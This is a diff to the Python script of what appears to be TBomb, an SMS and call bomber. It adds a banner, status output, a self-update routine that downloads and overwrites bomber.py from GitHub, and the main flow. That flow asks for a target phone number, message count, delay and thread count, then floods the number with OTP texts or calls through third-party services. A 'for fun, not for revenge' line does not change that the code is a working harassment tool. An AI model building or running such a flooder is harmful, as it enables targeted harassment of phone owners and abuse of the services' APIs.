@@ -229,6 +229,20 @@ country_codes = {
 }
 
 
+def banner():
+    cprint("""                                                  
+   ████████ ██████                 ██             
+   ▒▒▒██▒▒▒ ██▒▒▒██                ██             
+      ██    ██   ██  ████  ██   ██ ██             
+      ██    ██████▒ ██▒▒██ ███ ███ █████          
+      ██    ██▒▒▒██ ██  ██ ██▒█▒██ ██▒▒██         
+      ██    ██   ██ ██  ██ ██ ▒ ██ ██  ██         
+      ██    ██████▒ ▒████▒ ██   ██ █████▒         
+      ▒▒    ▒▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒          
+                                         """, 'green')
+    print()
+
+
 # Counts Number Of SMS in Infinite Mode
 count_inf = 0
 
@@ -266,6 +280,7 @@ def checkinternet():
     if res:
         print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
         print('\t\tTBomb Will Stop Now...\n\n')
+        banner()
         exit()
 
 
@@ -381,12 +396,14 @@ def remsp(num):
 
 def start(target, counter, delay, ch, cc):
     os.system("clear")
+    banner()
     failed = 0
     requested = 0
     success = int(requested) - int(failed)
     bombs = int(counter) + 1
     while success < (int(bombs)):
         os.system('clear')
+        banner()
         try:
             api = random.choice(ch)
         except Exception:
@@ -403,6 +420,8 @@ def start(target, counter, delay, ch, cc):
                     input(
                         '\nThis will help us to give support to your country fast...\n\nPress Enter To Exit...')
                     os.system('rm *.xxx* > /dev/null 2>&1')
+                    print('\n\n')
+                    banner()
                     exit()
                 else:
                     print('\n\n\tSorry Your Country is Not Supported...')
@@ -411,11 +430,16 @@ def start(target, counter, delay, ch, cc):
                     input('Press Enter To Exit...')
                     exit()
         print("==================================================================")
-        print("             Progress, please wait !!                             ")
+        print("                BOMBING in progress, please wait !!               ")
+        print("     Please keep your data connection active during bombing !!    ")
         print("==================================================================")
+        print("             Target Number           : +" + str(cc) + " ", target)
+        print("             Number of Requests Sent : ", requested)
         print("             Successful Requests     : ", success)
+        print("             Failed Requests         : ", failed)
         print("==================================================================")
-        print("             Created By M4ZART                                    ")
+        print("              Use this for fun, not for revenge !!                ")
+        print("              This Bomber Was Created By SpeedX !!                ")
         print("==================================================================")
 
         try:
@@ -434,3 +458,180 @@ def start(target, counter, delay, ch, cc):
             checkinternet()
     print('\n\nBombing Completed..')
     os.system('rm *.xxx* > /dev/null 2>&1')
+    banner()
+    exit()
+
+
+def update():
+    stuff_to_update = ['bomber.py', '.version']
+    for fl in stuff_to_update:
+        dat = urllib.request.urlopen(
+            "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/" + fl).read()
+        file = open(fl, 'wb')
+        file.write(dat)
+        file.close()
+    print('\n\t\tUpdated Successfull !!!!')
+    print('\tPlease Run The Script Again...')
+    exit()
+
+
+os.system("clear")
+banner()
+try:
+    urllib.request.urlopen('https://www.google.com')
+except Exception:
+    print("You are not connected To Internet!!!")
+    print("\tPlease Connect To Internet To Continue...\n")
+    input('Exiting....\n Press Enter To Continue....')
+    exit()
+print('\tChecking For Updates...')
+ver = urllib.request.urlopen(
+    "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").read().decode('utf-8')
+verl = ''
+try:
+    verl = open(".version", 'r').read()
+except Exception:
+    pass
+if ver != verl:
+    print('\n\t\tAn Update is Available....')
+    print('\tStarting Update...')
+    update()
+print("Your Version is Up-To-Date")
+print('\n\n\t\t\tStarting TBomb...\n\n')
+try:
+    noti = urllib.request.urlopen(
+        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").read().decode('utf-8')
+    noti = noti.upper().strip()
+    if len(noti) > 10:
+        print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
+except Exception:
+    pass
+while True:
+    pn = ""
+    cc = input("\tEnter Your Country Code (Without +) : ")
+    if '+' in cc:
+        tc = list(cc)
+        tc.remove('+')
+        cc = ''.join(tc)
+        cc = cc.strip()
+    pn = input("\tEnter Target Number: +" + cc + " ")
+    pn = remsp(pn)
+    if len(cc) >= 4 or len(cc) < 1:
+        print('\n\nInvalid Country Code..\n\t\tCountry Codes Are Generally 1-3 digits...\n')
+        continue
+    if len(pn) <= 6:
+        print('\n\nInvalid Phone Number..\n')
+        continue
+    for cch in str(cc + pn):
+        if not cch.isdigit():
+            print('\n\nPhone Number Must Consist Of Numbers Only\n')
+            continue
+    break
+type = 0
+try:
+    if sys.argv[1] == "call":
+        type = 1
+except Exception:
+    type = 0
+if type == 1:
+    nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
+    if nm > 15:
+        print("\t\tYou Have Entered " + str(nm) +
+              ".\n\tNormalizing Value To 15")
+        nm = 15
+    dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+elif type == 0:
+    if cc == "91":
+        nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))
+        dl = float(
+            input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
+    else:
+        nm = int(input("Enter Number of Messages To Send: "))
+        dl = float(
+            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+maxlim = 0
+if cc == "91":
+    maxlim = 500
+else:
+    maxlim = 100
+if nm > maxlim:
+    print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
+          str(maxlim) + ' SMS At Once...\n\n')
+    print('Number Of SMS Has been Set To ' + str(maxlim))
+    nm = maxlim
+if not cc.strip() == "91":
+    if type == 1:
+        print(
+            '\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
+        print()
+        input('Press Enter To Exit....')
+        print('\n\n')
+        banner()
+        exit()
+    cnt = 0
+    if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:
+        print('\n\n\tSeems Like You Have Given Wrong Inputs...')
+        input('\n\t\tPress Enter To Exit...')
+        banner()
+        exit()
+    ch = [0, 14, 15, 16]
+    start(pn, nm, dl, ch, str(cc))
+    exit()
+ch = [i for i in range(17)]
+cbomb = False
+if pn.strip() == '' or dl <= 0 or nm < 0:
+    print('\n\n\tSeems Like You Have Given Wrong Inputs...')
+    input('\n\t\tPress Enter To Exit...')
+    banner()
+    exit()
+if type == 1:
+    print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\n")
+    print("\n\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")
+    cbomb = True
+if cbomb:
+    chl = [100, 101, 102, 103, 104, 105, 106]
+    start(pn, nm, dl, chl, str(cc))
+    exit()
+if nm == 0:
+    nt = int(input("\tNumber Of Threads(10 to 20) : "))
+    if nt <= 0 or nt >= 30:
+        print('\tTBomb Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
+    print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
+    t = [None] * nt
+    print("\n\n==================================================================")
+    print("                Gearing Up Bomber, please wait !!               ")
+    print("     Please keep your data connection active during bombing !!    ")
+    print("==================================================================")
+    print("             Target Number       : +91", pn)
+    print("             Number of Threads   : ", nt)
+    print("             Delay               : ", dl)
+    print("==================================================================")
+    print("              Use this for fun, not for revenge !!                ")
+    print("              This Bomber Was Created By SpeedX !!                ")
+    print("==================================================================")
+    input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
+    os.system('rm *.xxx* > /dev/null 2>&1')
+    print("\n\nStarting Bomb....")
+    for i in range(nt):
+        t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
+        t[i].daemon = True
+        t[i].start()
+    time.sleep(2)
+    ci = 0
+    while True:
+        ci += 1
+        l = count_inf
+        print("	   Total Number of Requests Sent : ", l)
+        if int(l) > maxlim:
+            print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
+                  str(maxlim) + ' SMS At Once...\n\n')
+            input('Press Enter To Exit...')
+            os.system('rm *xxx* > /dev/null 2>&1')
+            banner()
+            exit()
+        time.sleep(1)
+        if ci % 3 == 0:
+            checkinternet()
+else:
+    start(pn, nm, dl, ch, '91')
+    exit()
